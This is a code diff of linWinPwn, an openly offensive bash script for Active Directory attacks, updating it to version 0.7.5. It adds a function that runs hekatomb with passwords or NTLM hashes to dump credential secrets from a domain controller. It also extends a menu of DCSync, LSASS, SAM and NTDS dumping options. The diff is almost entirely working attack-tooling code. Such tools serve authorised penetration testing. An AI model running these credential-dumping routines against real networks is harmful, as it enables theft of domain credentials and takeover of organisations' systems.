@@ -58,6 +58,7 @@ certipy=$(which certipy)
 ldeep=$(which ldeep)
 pre2k=$(which pre2k)
 certsync=$(which certsync)
+hekatomb=$(which hekatomb)
 donpapi="$scripts_dir/DonPAPI-main/DonPAPI.py"
 kerbrute="$scripts_dir/kerbrute"
 silenthound="$scripts_dir/silenthound.py"
@@ -75,7 +76,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.7.4 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.7.5 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -229,8 +230,8 @@ prepare (){
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "")
         argument_imp="${domain}/${user}:''" 
         argument_imp_gp="${domain}/${user}:''" 
+        argument_enum4linux="-w ${domain} -u ${user} -p ''"
         argument_bhd="-u ${user}@${domain} -p ''"
-        argument_adidns="-u ${domain}\\${user} -p ''"
         argument_ldd="-u ${domain}\\${user} -p ''"
         argument_smbmap="-d ${domain} -u ${user} -p ''"
         argument_certi_py="${domain}/${user}:''"
@@ -238,8 +239,14 @@ prepare (){
         argument_ldeep="-d ${domain} -u ${user} -p '' -a"
         argument_pre2k="-d ${domain} -u ${user} -p ''"
         argument_certsync="-d ${domain} -u ${user} -p ''"
+        argument_donpapi="${domain}/${user}:''"
+        argument_hekatomb="${domain}/${user}:''"
+        argument_silenthd="-u ${domain}\\${user} -p ''"
         argument_windap="-d ${domain} -u ${user} -p ''"
         argument_targkerb="-d ${domain} -u ${user} -p ''"
+        pass_bool=false
+        hash_bool=false
+        kerb_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
     
     #Check if multiple credentials provided
@@ -253,10 +260,10 @@ prepare (){
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "${password}")
         argument_imp="${domain}/${user}:${password}"
         argument_imp_gp="${domain}/${user}:${password}"
+        argument_bhd="-u ${user}@${domain} -p ${password}"
+        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         argument_adidns="-u ${domain}\\${user} -p ${password}"
         argument_ldd="-u ${domain}\\${user} -p ${password}"
-        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
-        argument_bhd="-u ${user}@${domain} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_certi_py="${domain}/${user}:${password}"
         argument_certipy="-u ${user}@${domain} -p ${password}"
@@ -264,6 +271,7 @@ prepare (){
         argument_pre2k="-d ${domain} -u ${user} -p ${password}"
         argument_certsync="-d ${domain} -u ${user} -p ${password}"
         argument_donpapi="${domain}/${user}:${password}"
+        argument_hekatomb="${domain}/${user}:${password}"
         argument_silenthd="-u ${domain}\\${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
         argument_targkerb="-d ${domain} -u ${user} -p ${password}"
@@ -279,8 +287,8 @@ prepare (){
             argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${hash}")
             argument_imp=" -hashes ${hash} ${domain}/${user}"
             argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
-            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 1 32)"
             argument_bhd="-u ${user}@${domain} --hashes ${hash}"
+            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 1 32)"
             argument_adidns="-u ${domain}\\${user} -p ${hash}"
             argument_ldd="-u ${domain}\\${user} -p ${hash}"
             argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
@@ -290,6 +298,7 @@ prepare (){
             argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
             argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
             argument_donpapi=" -H ${hash} ${domain}/${user}"
+            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
             argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
             argument_windap="-d ${domain} -u ${user} --hash ${hash}"
             argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
@@ -317,7 +326,7 @@ prepare (){
             cd ${current_dir}
             krb5cc="${output_dir}/Credentials/${user}.ccache"
         fi
-argument_kerbrute
+
         if [ -f "${krb5cc}" ] ; then
             target=${dc_FQDN}
             target_sql=${sql_hostname_list}
@@ -359,6 +368,7 @@ argument_kerbrute
         argument_pre2k="${argument_pre2k} -verbose"
         argument_certsync="${argument_certsync} -debug"
         argument_donpapi="-d ${argument_donpapi}"
+        argument_hekatomb="-debug ${argument_hekatomb}"
         argument_windap="${argument_windap} -v --debug"
         argument_targkerb="${argument_targkerb} -v"
         argument_kerbrute="-v"
@@ -1418,6 +1428,23 @@ donpapi_dump () {
     echo -e ""
 }
 
+hekatomb_dump () {
+    if [ ! -f "${hekatomb}" ] ; then
+        echo -e "${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}"
+    else
+        echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos tickets${NC}"
+        else
+            current_dir=$(pwd)
+            cd ${output_dir}/Credentials
+            ${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
+            cd ${current_dir} 
+        fi
+    fi
+    echo -e ""
+}
+
 masky_dump () {
     echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
@@ -1955,7 +1982,7 @@ pwd_menu () {
     echo -e "m) Modify target(s)"
     echo -e "1) LAPS Dump using crackmapexec"
     echo -e "2) gMSA Dump using crackmapexec"
-    echo -e "3) DCSync using secretsdump"
+    echo -e "3) DCSync using secretsdump (only on DC)"
     echo -e "4) Dump SAM and LSA using secretsdump"
     echo -e "5) Dump NTDS using crackmapexec"
     echo -e "6) Dump SAM using crackmapexec"
@@ -1966,7 +1993,8 @@ pwd_menu () {
     echo -e "11) Dump LSASS using nanodump"
     echo -e "12) Dump LSASS using masky (ADCS required)"
     echo -e "13) Dump secrets using DonPAPI"
-    echo -e "14) Dump NTDS using certsync"
+    echo -e "14) Dump NTDS using certsync (ADCS required) (only on DC)"
+    echo -e "15) Dump secrets using hekatomb (only on DC)"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2052,6 +2080,11 @@ pwd_menu () {
         pwd_menu
         ;;
 
+        15)
+        hekatomb_dump
+        pwd_menu
+        ;;
+
         99)
         main_menu
         ;;
@@ -2115,6 +2148,7 @@ config_menu () {
         if [ ! -x "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
         if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
         if [ ! -x "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not executable${NC}"; else echo -e "${GREEN}[+] DonPAPI is executable${NC}"; fi
+        if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
         config_menu
         ;;
 
